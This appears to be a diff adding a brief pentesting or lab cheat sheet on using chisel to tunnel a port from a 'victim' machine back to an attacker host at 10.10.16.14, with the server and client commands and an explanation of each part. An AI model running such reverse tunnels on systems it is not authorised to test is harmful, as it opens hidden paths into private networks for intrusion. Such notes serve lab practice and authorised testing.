@@ -1,0 +1,11 @@
+## Simple commmands to run to forward a port from the victim to our attacker box
+
+On Attacker Machine:
+  `./chisel server -p 8000 --reverse`
+  
+On Victim Machine:
+  `./chisel client 10.10.16.14:8000 R:9001:127.0.0.1:8000 &`
+  
+  -Breaking down the above command 10.10.16.14:8000 is the IP:PORT where we opened our reverse proxy i.e the ip address and port on attacker machine
+  -R:9001 tells on which port to forward the connection on attacker machine.
+  -The latter part is the ip:port that we are forwarding from the victim to our attacker box and `&` is to background the process so that we can forward multiple ports at once.
